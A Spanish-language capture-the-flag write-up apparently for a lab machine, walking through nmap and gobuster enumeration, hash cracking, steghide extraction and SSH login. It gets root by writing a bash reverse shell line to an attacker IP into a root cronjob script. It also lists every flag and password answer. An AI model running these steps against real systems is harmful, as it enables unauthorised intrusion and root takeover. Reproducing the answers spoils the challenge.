# 1. Enumeración mediante Nmap

## a) ¿Cuántos puertos están abiertos?

Si realizamos un escaneo sencillo con Nmap usando:

```
nmap -sV -T4 10.10.123.131
```

Solo nos muestra un puerto abierto, el 80.

![](IMG/Pasted%20image%2020250411131854.png)

Lo cual resulta bastante extraño, así que hacemos un Nmap algo mas completo para que nos muestre todos los puertos abiertos de la máquina, con sus servicios, usamos:

```
nmap -p 1-65535 -T5 -sV 10.10.123.131
```

![](IMG/Pasted%20image%2020250411134135.png)

Ahora sí, vemos que tiene 3 puertos abiertos.

**Respuesta: 3**

## b) ¿Cuál es la versión de nginx?

En ese mismo escaneo, vemos que la version de nginx es la 1.16.1

![](IMG/Pasted%20image%2020250411134254.png)

**Respuesta: 1.16.1**

## c) ¿Qué se está ejecutando en el puerto más alto?

También en el escaneo vemos que lo que se ejecuta en el puerto mas alto es un servidor web Apache.

![](IMG/Pasted%20image%2020250411134408.png)

**Respuesta: Apache**

# 2. Comprometiendo la máquina

## a) Usando GoBuster, busque la bandera 1.

Usaremos GoBuster de la siguiente forma:

```
gobuster dir -e -u http://10.10.123.131 -w /usr/share/dirb/wordlists/common.txt
```

Usamos un diccionario de poco peso, para un primer reconocimiento, con rutas comunes, así será mas rápido.

![](IMG/Pasted%20image%2020250411135113.png)

Hemos obtenido un archivo robots.txt, el cual, si accedemos a él, no encontramos nada interesante.

![](IMG/Pasted%20image%2020250411135214.png)

Y hemos encontrado una directorio llamado "hidden", el cual, si accedemos a el, obtenemos una imagen. 

![](IMG/Pasted%20image%2020250411135334.png)

En el código fuente, no encontramos nada interesante.

![](IMG/Pasted%20image%2020250411135414.png)

Así que volvemos a ejecutar GoBuster, pero en esta ocasión, vamos ha hacerlo sobre el directorio hidden, por si escondiera algo más. Usamos:

```
gobuster dir -e -u http://10.10.123.131/hidden -w /usr/share/dirb/wordlists/common.txt
```

Y obtenemos un nuevo directorio dentro de hidden, llamado "whatever".

![](IMG/Pasted%20image%2020250411135651.png)

Accediendo a él, obtenemos otra imagen.

![](IMG/Pasted%20image%2020250411135750.png)

En este caso, en el código fuente de la página, obtenemos lo que parece algo codificado en base64.

![](IMG/Pasted%20image%2020250411135844.png)

Así que usando Cyberchef, tratamos de decodificarlo.

![](IMG/Pasted%20image%2020250411135956.png)

Y hemos obtenido la primera flag.

**Respuesta: flag{f1rs7_fl4g}**

## b) Enumere más a fondo la máquina, ¿cuál es la bandera 2?

Bien, ya en este punto, no creo que se pueda sacar mucho del servidor nginx (puerto 80), así que usaremos GoBuster de nuevo, pero en este caso lo haremos sobre el servidor Apache que vimos que está corriendo en el puerto 65524. Lo hacemos así:

```
gobuster dir -e -u http://10.10.123.131:65524 -w /usr/share/dirb/wordlists/common.txt
```

![](IMG/Pasted%20image%2020250411140537.png)

Vemos que tenemos acceso al index.html, que es la página principal por defecto de Apache, y que no nos aporta nada, ni siquiera en su código fuente.

![](IMG/Pasted%20image%2020250411140619.png)

Y existe también un archivo robots.txt

![](IMG/Pasted%20image%2020250411140724.png)

En el que encontramos una información sospechosa, parece una especie de código y nos habla sobre una flag. Parece ser un hash de una contraseña, usamos name-that-hash (nth) para averiguar de que tipo de hash se trata.

```
nth -t 'a18672860d0510e5ab6699730763b250' -v --no-banner
```

![](IMG/Pasted%20image%2020250411141621.png)

Vemos que se trata de un hash md5, el cual, si lo decodificamos en www.md5hashing.net, obtenemos la siguiente flag.

![](IMG/Pasted%20image%2020250411141322.png)

**Respuesta: flag{1m_s3c0nd_fl4g}**

## c) Descifra el hash con easypeasy.txt, ¿Cuál es la bandera 3?

Aunque antes dijimos que en el código fuente de index.html no había nada interesante, revisando en busca de más cosas, pues no sabía muy bien por donde seguir, he encontrado la tercera flag en su código.

![](IMG/Pasted%20image%2020250411142111.png)

**Respuesta: flag{9fdafbd64c47471a8f54cd3fc64cd312}**

## d) ¿Cual es el directorio oculto? 

En index.html, también hemos encontrado lo siguiente

![](IMG/Pasted%20image%2020250411143150.png)

Nos indica que está codificado en algún tipo de base, así que lo intentamos descifrar usando cyberchef de nuevo, y vemos que es un base62 y que oculta la ruta de un directorio.

![](IMG/Pasted%20image%2020250411143326.png)

**Respuesta: /n0th1ng3ls3m4tt3r**

## e) Usando la lista de palabras que le proporcionamos en esta tarea, descifre el hash. Cuál es la contraseña?

Si accedemos al directorio oculto, volvemos a ver otra imagen.

![](IMG/Pasted%20image%2020250411143549.png)

Si miramos el código fuente de la página, vemos el nombre de la imagen y un código, que parece ser otro hash.

![](IMG/Pasted%20image%2020250411143624.png)

Así que guardamos el hash en un archivo, y lo analizaremos con hashcat. Usamos

```
hashcat --show hash
```

Con esto, vemos las diferentes posibilidades para descifrarlo.

![](IMG/Pasted%20image%2020250411144341.png)

El que nos ha funcionado ha sido GOST R 34.11-94 (id 6900), hemos usado esto

```
hashcat -m 6900 hash easypeasy_1596838725703.txt
```

![](IMG/Pasted%20image%2020250411145025.png)

Y conseguimos lo que buscábamos.

![](IMG/Pasted%20image%2020250411145056.png)

**Respuesta: mypasswordforthatjob**

## f) ¿Cuál es la contraseña para iniciar sesión en la máquina a través de SSH?

Hemos probado a introducir la contraseña que hemos obtenido para acceder por SSH, pero evidentemente, no era esa, no podía ser tan fácil. Tras dar varias vueltas descargué la imagen que aparecía en el código fuente, que era la que venía acompañada del código que desciframos antes para obtener la contraseña, lo que hace pensar que quizás tengan algo que ver.

![](IMG/Pasted%20image%2020250411145425.png)

Una vez descargada, tratamos de decodificarla por si tuviera algo oculto con steghide. Usamos

```
steghide info binarycodepixabay.jpg
```

![](IMG/Pasted%20image%2020250411150122.png)

Y nos pide una contraseña, usamos la que averiguamos antes, y vemos que la imagen tiene un fichero de texto adjunto llamado secrettext.txt

![](IMG/Pasted%20image%2020250411150220.png)

Asi que lo extraemos, usando la contraseña de antes. Usamos

```
steghide --extract -sf binarycodepixabay.jpg
```

Una vez extraído el archivo, si lo abrimos, vemos que nos dice un nombre de usuario y una contraseña que está en código binario.

![](IMG/Pasted%20image%2020250411151901.png)

Así que usamos de nuevo Cyberchef y convertimos el código binario.

![](IMG/Pasted%20image%2020250411152109.png)

Ya tenemos la contraseña para acceder por SSH.

**Respuesta: iconvertedmypasswordtobinary**

## g) ¿Cual es la flag de usuario?

Lo primero que hacemos es acceder por ssh con las credenciales que hemos obtenido, primero hemos intentado conectar de forma normal, no recordaba que ssh no esta en el puerto 22, como vimos en el nmap del principio está en el pueeto 6498, así que usamos:

```
ssh boring@10.10.123.131 -p 6498
```

![](IMG/Pasted%20image%2020250411153949.png)

Una vez conectados si listamos los archivos, encontramos el archivo user.txt, si vemos su contenido, encontramos la flag, pero nos advierte de que está "rotated", así que suponemos que usara ROT.

![](IMG/Pasted%20image%2020250411154138.png)

la desciframos usando de nuevo cyberchef y obtenemos la flag.

![](IMG/Pasted%20image%2020250411154405.png)

**Respuesta: flag{n0wits33msn0rm4l}**

## h) ¿Cual es la flag de root? 

Para conseguir permisos de root y averiguar la flag, teníamos una pista de como conseguirlo en la descripción de este reto.

![](IMG/Pasted%20image%2020250411154722.png)

Así que deberemos buscar un cronjob vulnerable, para ello, listaremos lo cronjobs actuales. Usamos:

```
cat /etc/crontab
```

Y vemos, que hay una especie de script bash sospechoso que se ejecuta como root

![](IMG/Pasted%20image%2020250411154919.png)

Sabiendo esto, trataremos de modificar este script para que nos de el acceso root que necesitamos. Para ello, vamos a usar una shell reversa de [Pentest monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) para bash.

![](IMG/Pasted%20image%2020250411155107.png)

Modificaremos el código con la ip de nuestra maquina y el puerto donde escucharemos.

```
bash -i >& /dev/tcp/10.8.16.0/1234 0>&1
```

Y lo añadimos al script

![](IMG/Pasted%20image%2020250411155959.png)

Ahora, iniciamos un listener, para que reciba la conexión de la shell reversa

```
nc -lvnp 1234
```

Y la obtenemos rápidamente, si ejecutamos whoami, veremos que ya somos root

![](IMG/Pasted%20image%2020250411160152.png)

Ahora, vamos al directorio raiz y listamos los archivos

![](IMG/Pasted%20image%2020250411160314.png)

Abrimos el archivo .root.txt y vemos la flag.

**Respuesta: flag{63a9f0ea7bb98050796b649e85481845}**